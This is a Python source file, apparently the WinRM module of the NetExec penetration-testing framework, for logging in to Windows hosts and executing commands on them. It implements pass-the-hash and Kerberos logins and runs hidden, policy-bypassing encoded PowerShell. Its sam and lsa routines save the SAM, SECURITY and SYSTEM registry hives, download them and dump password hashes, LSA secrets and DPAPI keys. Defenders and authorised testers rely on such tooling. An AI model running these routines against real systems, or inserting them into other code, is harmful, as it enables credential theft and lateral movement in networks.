import os
import base64
import binascii
import html
import re
import traceback
import requests
import urllib3
import ntpath
from termcolor import colored
import xml.etree.ElementTree as ET

from dploot.lib.network.winrm import WINRMTarget as Target
from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes

from nxc.config import process_secret, host_info_colors
from nxc.connection import connection
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.dpapi import DPAPITriage
from nxc.helpers.misc import gen_random_string, sanitize_dns
from nxc.helpers.negotiate_parser import parse_challenge
from nxc.logger import NXCAdapter

from impacket.winrm import (
    BasicTransport,
    ClientCertificateTransport,
    CredSSPTransport,
    KerberosTransport,
    NegotiateTransport,
    NTCredential,
    WinRSClient,
    WinRMAuthError,
    WinRMFaultError,
    WinRMTransportError,
    get_kerberos_credential,
    _build_envelope
)


urllib3.disable_warnings()

WSMAN_ENUMERATE_ACTION = "http://schemas.xmlsoap.org/ws/2004/09/enumeration/Enumerate"
WSMAN_SHELL_RESOURCE_URI = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
WSEN_NAMESPACE = "http://schemas.xmlsoap.org/ws/2004/09/enumeration"
WSMAN_NAMESPACE = "http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"


def parse_hashes(hashes):
    if not hashes:
        return "", ""

    if ":" in hashes:
        lmhash, nthash = hashes.split(":", 1)
        return lmhash, nthash

    return "", hashes


def build_command(command, shell_type):
    if shell_type == "powershell":
        command = f'$ProgressPreference="SilentlyContinue";{command}'
        encoded = base64.b64encode(command.encode("utf-16le")).decode("ascii")
        return "powershell.exe", ["-NoP", "-NoL", "-sta", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Enc", encoded]
    # The WinRS shell already runs the command line through cmd.exe /c
    return command, []


def parse_clixml(stderr):
    """powershell.exe writes its error stream to stderr as CLIXML, keep the error messages only"""
    if not stderr.startswith("#< CLIXML"):
        return stderr
    errors = html.unescape("".join(re.findall(r'<S S="Error">(.*?)</S>', stderr, re.DOTALL)))
    return re.sub(r"_x([0-9A-F]{4})_", lambda match: chr(int(match[1], 16)), errors)


def build_admin_check_request(timeout=20, session_id=None):
    envelope, header, body = _build_envelope("create", resource_uri=WSMAN_SHELL_RESOURCE_URI, timeout=timeout, session_id=session_id)

    action = header.find("{http://schemas.xmlsoap.org/ws/2004/08/addressing}Action")

    if action is None:
        raise WinRMTransportError("Unable to find WS-Man Action header")
    action.text = WSMAN_ENUMERATE_ACTION
    enumerate_msg = ET.SubElement(body, f"{{{WSEN_NAMESPACE}}}Enumerate")
    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}OptimizeEnumeration")
    ET.SubElement(enumerate_msg, f"{{{WSMAN_NAMESPACE}}}MaxElements").text = "32000"

    return envelope


class KerberosFallbackTransport:
    """Kerberos transport which retries through Negotiate when GSS fails."""

    def __init__(self, url, credentials):
        self.url = url
        self.credentials = credentials
        self.transport = KerberosTransport(url, credentials)
        self.fallback_attempted = False

    def send(self, request):
        try:
            return self.transport.send(request)
        except WinRMAuthError:
            if self.fallback_attempted:
                raise

            self.fallback_attempted = True
            self.transport.close()
            self.transport = NegotiateTransport(self.url, self.credentials)
            return self.transport.send(request)

    def close(self):
        self.transport.close()


class winrm(connection):
    def __init__(self, args, db, host):
        self.domain = ""
        self.server_os = None
        self.endpoint = None
        self.lmhash = ""
        self.nthash = ""
        self.ssl = False
        self.challenge_header = None
        self.targetDomain = None
        self.no_ntlm = False
        self.dpapi_system_key = None
        self.no_da = None

        self._dpapi_triage = None

        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "WINRM",
                "host": self.host,
                "port": "5985",
                "hostname": self.hostname,
            }
        )

    def enum_host_info(self):
        try:
            ntlm_info = parse_challenge(base64.b64decode(self.challenge_header.split(" ")[1].replace(",", "")))
        except Exception as e:
            self.logger.debug(f"Error parsing NTLM challenge: {e!s}")
            self.logger.debug(f"Raw challenge: {self.challenge_header.split(' ')[1].replace(',', '')[:20]}...")
            self.logger.error("Invalid NTLM challenge received from server. This may indicate NTLM is not supported, use Kerberos")
            self.no_ntlm = True
        else:
            dns_hostname = ntlm_info["dns_hostname"] or ""
            hostname = ntlm_info["hostname"] or dns_hostname.split(".", 1)[0] or self.host
            domain = ntlm_info["domain"] or (dns_hostname.split(".", 1)[1] if "." in dns_hostname else self.host)
            self.hostname = sanitize_dns(hostname, self.logger)
            self.targetDomain = self.domain = sanitize_dns(domain, self.logger)
            self.server_os = ntlm_info["os_version"]
            self.logger.extra["hostname"] = self.hostname

        try:
            self.db.add_host(self.host, self.port, self.hostname, self.targetDomain, self.server_os)
        except Exception as e:
            self.logger.debug(f"Error adding host to database: {e!s}")

        if self.args.domain:
            self.domain = self.args.domain
        if self.args.local_auth:
            self.domain = self.hostname

        if not self.kdcHost and self.domain and self.domain == self.targetDomain:
            result = self.resolver(self.domain)
            self.kdcHost = result["host"] if result else None
            self.logger.info(f"Resolved domain: {self.domain} with dns, kdcHost: {self.kdcHost}")

    def print_host_info(self):
        self.logger.extra["protocol"] = "WINRM-SSL" if self.ssl else "WINRM"
        self.logger.extra["port"] = self.port
        ntlm = colored(f"(NTLM:{not self.no_ntlm})", host_info_colors[2], attrs=["bold"]) if self.no_ntlm else ""
        self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.targetDomain}) {ntlm}")

    def create_conn_obj(self):
        if self.is_link_local_ipv6:
            self.logger.fail("winrm not support link-local ipv6, exiting...")
            return False

        endpoints = {}

        headers = {
            "Content-Length": "0",
            "Keep-Alive": "true",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "User-Agent": "Microsoft WinRM Client",
            "Authorization": "Negotiate TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="
        }

        for protocol in self.args.check_proto:
            endpoints[protocol] = {}
            endpoints[protocol]["port"] = self.port[self.args.check_proto.index(protocol)] if len(self.port) == 2 else self.port[0]
            endpoints[protocol]["url"] = f"{protocol}://{self.host if not self.is_ipv6 else f'[{self.host}]'}:{endpoints[protocol]['port']}/wsman"
            endpoints[protocol]["ssl"] = (protocol != "http")

        for protocol in endpoints:
            self.port = endpoints[protocol]["port"]
            try:
                self.logger.debug(f"Requesting URL: {endpoints[protocol]['url']}")
                res = requests.post(endpoints[protocol]["url"], headers=headers, verify=False, timeout=self.args.http_timeout)
                self.logger.debug(f"Received response code: {res.status_code}")
                self.challenge_header = res.headers.get("WWW-Authenticate")
                if (not self.challenge_header) or ("Negotiate" not in self.challenge_header):
                    self.logger.info('Failed to get NTLM challenge from target "/wsman" endpoint, maybe isn\'t winrm service.')
                    return False
                self.endpoint = endpoints[protocol]["url"]
                self.ssl = endpoints[protocol]["ssl"]
                return True
            except requests.exceptions.Timeout as e:
                self.logger.info(f"Connection Timed out to WinRM service: {e}")
            except requests.exceptions.ConnectionError as e:
                if "Max retries exceeded with url" in str(e):
                    self.logger.info("Connection Timeout to WinRM service (max retries exceeded)")
                else:
                    self.logger.info(f"Other ConnectionError to WinRM service: {e}")
        return False

    def check_if_admin(self):
        self.admin_privs = False

        try:
            self.conn._send(build_admin_check_request(timeout=self.conn.timeout, session_id=self.conn.session_id))
            self.admin_privs = True

        except WinRMFaultError as e:
            self.logger.debug(f"WinRM administrator check failed: {e!s}")

        return self.admin_privs

    def connect_winrs(self, username, password=None, hashes=None, use_cache=False):
        self.disconnect()

        # Like on main, --http-timeout only covers the probe: impacket's WinRS timeouts keep the socket (30s) above the operation timeout (20s)
        url = self.endpoint
        lmhash, nthash = parse_hashes(hashes or "")

        use_basic = bool(getattr(self.args, "basic", False))
        use_credssp = bool(getattr(self.args, "credssp", False))

        cert_pem = getattr(self.args, "cert_pem", "") or ""
        cert_key = getattr(self.args, "cert_key", "") or ""

        if cert_pem or cert_key:
            if not cert_pem or not cert_key:
                raise WinRMTransportError("Client certificate authentication requires both -cert-pem and -cert-key")

            if not self.ssl:
                raise WinRMTransportError("Client certificate authentication requires HTTPS")

            transport = ClientCertificateTransport(url, cert_pem, cert_key)

        elif use_basic:
            if not username or password is None or password == "":
                raise WinRMTransportError("Basic authentication requires a username and password")

            transport = BasicTransport(url, username, password)

        elif self.kerberos:
            kerberos_credentials = get_kerberos_credential(f"HTTP/{self.hostname}", domain=self.domain, username=username, password=password or "", lmhash=lmhash, nthash=nthash, aes_key=self.aesKey, kdc_host=self.kdcHost, use_cache=use_cache)

            if use_credssp:
                if not kerberos_credentials.password:
                    raise WinRMTransportError("CredSSP needs a plaintext password, even when using Kerberos")

                transport = CredSSPTransport(url, kerberos_credentials)
            else:
                transport = KerberosFallbackTransport(url, kerberos_credentials)

        else:
            credentials = NTCredential(
                domain=self.domain or "",
                username=username or "",
                password=password or "",
                lmhash=bytes.fromhex(lmhash) if lmhash else "",
                nthash=bytes.fromhex(nthash) if nthash else "",
            )

            if use_credssp:
                if not credentials.username or not credentials.password:
                    raise WinRMTransportError("CredSSP needs a username and plaintext password")

                transport = CredSSPTransport(url, credentials)
            else:
                transport = NegotiateTransport(url, credentials)

        self.conn = WinRSClient(transport)

    def kerberos_login(self, domain, username, password="", ntlm_hash="", aesKey="", kdcHost="", useCache=False):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.domain = domain
        self.username = username
        self.password = password or ""
        secret = aesKey or ntlm_hash or password
        used_ccache = " from ccache" if useCache else f":{process_secret(secret)}"

        try:
            self.kdcHost = kdcHost or self.kdcHost
            if aesKey:
                self.aesKey = aesKey

            self.connect_winrs(username, password=password, hashes=ntlm_hash, use_cache=useCache)

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}{used_ccache} {self.mark_pwned()}")

            # The creds DB only holds passwords and NT hashes, not AES keys or ccache logins
            if not aesKey and not useCache:
                cred_type = "hash" if ntlm_hash else "plaintext"
                self.db.add_credential(cred_type, domain, self.username, secret)
                user_id = self.db.get_credential(cred_type, domain, self.username, secret)
                host_id = self.db.get_hosts(self.host)[0].id
                self.db.add_loggedin_relation(user_id, host_id)
                if self.admin_privs:
                    self.db.add_admin_user(cred_type, domain, self.username, secret, self.host, user_id=user_id)

            if self.admin_privs:
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if self.username:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            self.logger.fail(f"{self.domain}\\{self.username}{used_ccache} {e!s}")
            self.disconnect()
            return False

    def plaintext_login(self, domain, username, password):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.password = password
        self.username = username
        self.domain = domain

        try:
            self.connect_winrs(username, password=password)

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
            self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
            self.db.add_credential("plaintext", domain, self.username, self.password)
            user_id = self.db.get_credential("plaintext", domain, self.username, self.password)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("plaintext", domain, self.username, self.password, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "status 401" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {e!s}")
            self.disconnect()
            return False

    def hash_login(self, domain, username, ntlm_hash):
        os.environ["NETBIOS_COMPUTER_NAME"] = self.hostname
        self.admin_privs = False
        self.username = username
        self.domain = domain
        # dploot's pypsrp session (--dpapi) only takes the hash in the LM:NT form
        self.lmhash, self.nthash = ntlm_hash.split(":") if ":" in ntlm_hash else ("00000000000000000000000000000000", ntlm_hash)

        try:
            self.connect_winrs(username, hashes=ntlm_hash)

            self.check_if_admin()
            self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {self.mark_pwned()}")

            self.db.add_credential("hash", domain, self.username, ntlm_hash)
            user_id = self.db.get_credential("hash", domain, self.username, ntlm_hash)
            host_id = self.db.get_hosts(self.host)[0].id
            self.db.add_loggedin_relation(user_id, host_id)

            if self.admin_privs:
                self.db.add_admin_user("hash", domain, self.username, self.nthash, self.host, user_id=user_id)
                add_user_bh(f"{self.hostname}$", domain, self.logger, self.config)

            if not self.args.local_auth and self.username != "":
                add_user_bh(self.username, self.domain, self.logger, self.config)
            return True

        except Exception as e:
            if "status 401" in str(e):
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)}")
            else:
                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.nthash)} {e!s}")
            self.disconnect()
            return False

    def disconnect(self):
        if self.conn is not None:
            self.conn.close()
            self.conn = None

    def run_command(self, command, shell_type="cmd"):
        """Run a command in the WinRS shell and return its stdout, its stderr (error messages only for powershell) and its exit code"""
        executable, arguments = build_command(command, shell_type)
        output = self.conn.execute(executable, arguments=arguments).iter_output()
        streams = {"stdout": b"", "stderr": b""}
        try:
            while True:
                stream_name, data = next(output)
                streams[stream_name] += data
        except StopIteration as e:
            exit_code = e.value
        return streams["stdout"].decode(self.args.codec, errors="replace"), parse_clixml(streams["stderr"].decode(self.args.codec, errors="replace")), exit_code

    def execute(self, payload=None, get_output=False, shell_type="cmd"):
        if not payload:
            payload = self.args.execute

        try:
            stdout, stderr, exit_code = self.run_command(payload, shell_type)
        except Exception as e:
            self.logger.debug(traceback.format_exc())
            if isinstance(e, WinRMFaultError) and "AccessDenied" in e.code:
                self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
            else:
                self.logger.fail(f"Execute command failed, error: {e!s}")
            return None

        if get_output:
            return stdout
        self.logger.success(f"Executed command (shell type: {shell_type})")
        if self.args.no_output:
            return None

        if shell_type == "powershell":
            if exit_code:
                self.logger.fail("Error executing powershell command, non-zero return code")
            for line in stderr.replace("\r", "").splitlines():
                self.logger.fail(line.rstrip())
            for line in stdout.replace("\r", "").splitlines():
                self.logger.highlight(line.rstrip())
        elif exit_code == 0:
            for line in stdout.replace("\r", "").splitlines():
                self.logger.highlight(line.rstrip())
        else:
            for line in stderr.replace("\r", "").splitlines():
                self.logger.fail(line.rstrip())
        return None

    def ps_execute(self, payload=None, get_output=False):
        command = payload if payload else self.args.ps_execute
        return self.execute(payload=command, get_output=get_output, shell_type="powershell")

    def download_file(self, remote_path, local_path):
        escaped = remote_path.replace("'", "''")
        stdout, stderr, exit_code = self.run_command(f"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{escaped}'))", "powershell")
        if exit_code:
            raise RuntimeError(stderr.strip().splitlines()[0])
        with open(local_path, "wb") as fp:
            fp.write(base64.b64decode("".join(stdout.split())))

    def get_file(self, remote_path=None, download_path=None):
        remote_path = remote_path if remote_path else self.args.get_file[0]
        local_path = download_path if download_path else self.args.get_file[1]

        if local_path.endswith("/"):
            local_path += ntpath.basename(remote_path)

        try:
            self.logger.display(f'Downloading "{remote_path}" to "{local_path}"')
            self.download_file(remote_path, local_path)
            self.logger.success(f"File {remote_path} has been saved to {local_path}")
        except Exception as e:
            self.logger.fail(f"Failed to get file {remote_path}, error: {e!s}")

    def put_file(self, local_path=None, remote_path=None):
        local_path = local_path if local_path else self.args.put_file[0]
        remote_path = remote_path if remote_path else self.args.put_file[1]
        remote_path += os.path.basename(local_path) if remote_path.endswith(("\\", "/")) else ""

        try:
            self.logger.display(f'Uploading "{local_path}" to "{remote_path}"')
            with open(local_path, "rb") as fp:
                encoded = base64.b64encode(fp.read()).decode("ascii")
            escaped = remote_path.replace("'", "''")
            _, stderr, exit_code = self.run_command(f"[IO.File]::WriteAllBytes('{escaped}', [Convert]::FromBase64String('{encoded}'))", "powershell")
            if exit_code:
                raise RuntimeError(stderr.strip().splitlines()[0])
            self.logger.success(f"File {local_path} has been uploaded to {remote_path}")
        except Exception as e:
            self.logger.fail(f"Failed to put file {local_path} to {remote_path}, error: {e!s}")

    def dir(self, directory=None):
        directory = directory if directory else self.args.dir
        out = self.execute(f"dir {directory}", True)
        if out is not None:
            for line in out.splitlines():
                self.logger.highlight(line.rstrip())

    def sam(self):
        sam_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SAM C:\\windows\\temp\\{sam_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{sam_storename} & del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="sam")

        try:
            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
            if exit_code:
                self.logger.fail(f"Failed to dump SAM hashes, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
                return
            self.download_file(f"C:\\windows\\temp\\{sam_storename}", f"{output_filename}.sam")
            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
        except Exception as e:
            self.logger.fail(f"Failed to dump SAM hashes, error: {e!s}")
        else:
            self.logger.display("Dumping SAM hashes")
            local_operations = LocalOperations(f"{output_filename}.system")
            boot_key = local_operations.getBootKey()
            SAM = SAMHashes(
                f"{output_filename}.sam",
                boot_key,
                isRemote=None,
                perSecretCallback=lambda secret: self.logger.highlight(secret),
            )
            SAM.dump()
            SAM.export(output_filename)
        finally:
            try:
                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
            except Exception as e:
                self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{sam_storename} and C:\\windows\\temp\\{system_storename}: {e}")

    def lsa(self, quiet=False):
        security_storename = gen_random_string(6)
        system_storename = gen_random_string(6)
        dump_command = f"reg save HKLM\\SECURITY C:\\windows\\temp\\{security_storename} && reg save HKLM\\SYSTEM C:\\windows\\temp\\{system_storename}"
        clean_command = f"del C:\\windows\\temp\\{security_storename} & del C:\\windows\\temp\\{system_storename}"
        output_filename = self.output_file_template.format(output_folder="lsa")

        try:
            _, stderr, exit_code = self.run_command(dump_command if self.args.dump_method == "cmd" else f"cmd /c '{dump_command}'", self.args.dump_method)
            if exit_code:
                self.logger.fail(f"Failed to dump LSA secrets, it may have been detected by AV or current user is not privileged user: {stderr.strip()}")
                return
            self.download_file(f"C:\\windows\\temp\\{security_storename}", f"{output_filename}.security")
            self.download_file(f"C:\\windows\\temp\\{system_storename}", f"{output_filename}.system")
        except Exception as e:
            self.logger.fail(f"Failed to dump LSA secrets, error: {e!s}")
        else:
            if not quiet:
                self.logger.display("Dumping LSA secrets")
            local_operations = LocalOperations(f"{output_filename}.system")
            boot_key = local_operations.getBootKey()

            def lsa_secret_callback(_, secret):
                if "dpapi_machinekey" not in secret:
                    if not quiet:
                        self.logger.highlight(secret)
                else:
                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
                    if not quiet:
                        self.logger.highlight(f"dpapi_machinekey:{self.dpapi_system_key['MachineKey'].hex()}")
                        self.logger.highlight(f"dpapi_userkey:{self.dpapi_system_key['UserKey'].hex()}")
            LSA = LSASecrets(
                f"{output_filename}.security",
                boot_key,
                None,
                isRemote=None,
                perSecretCallback=lsa_secret_callback
            )
            LSA.dumpCachedHashes()
            LSA.dumpSecrets()
        finally:
            try:
                self.run_command(clean_command if self.args.dump_method == "cmd" else f"cmd /c '{clean_command}'", self.args.dump_method)
            except Exception as e:
                self.logger.fail(f"[OPSEC] Cleanup command failed, check C:\\windows\\temp\\{security_storename} and C:\\windows\\temp\\{system_storename}: {e}")

    def dpapi(self):
        self.dpapi_triage.triage_dpapi()

    @property
    def dpapi_triage(self) -> DPAPITriage:
        if self._dpapi_triage is not None:
            return self._dpapi_triage
        target = Target.create(
            domain=self.domain,
            username=self.username,
            password=self.password,
            address=self.host,
            port=self.port,
            ssl=self.ssl,
            lmhash=self.lmhash,
            nthash=self.nthash,
        )

        self._dpapi_triage = DPAPITriage(self, target)
        return self._dpapi_triage
